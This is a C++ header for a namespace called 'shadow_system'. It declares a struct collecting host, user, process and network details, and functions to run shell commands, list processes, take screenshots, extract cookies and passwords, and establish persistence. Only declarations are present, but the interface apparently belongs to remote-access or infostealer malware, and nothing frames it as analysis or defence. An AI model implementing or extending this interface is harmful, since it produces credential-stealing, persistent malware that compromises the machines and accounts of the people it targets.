#ifndef SYSTEM_INFO_HPP
#define SYSTEM_INFO_HPP

#include <string>
#include <vector>
#include <map>

namespace shadow_system {
    struct SystemInfo {
        std::string hostname;
        std::string username;
        std::string os_name;
        int cpu_count;
        long memory_total;
        long memory_used;
        std::string cwd;
        int pid;
        std::vector<std::map<std::string, std::string>> network_interfaces;
    };
    
    SystemInfo get_system_info();
    std::string execute_shell(const std::string& command);
    std::string get_processes();
    std::string take_screenshot();
    std::string extract_cookies();
    std::string extract_passwords();
    bool establish_persistence();
}

#endif
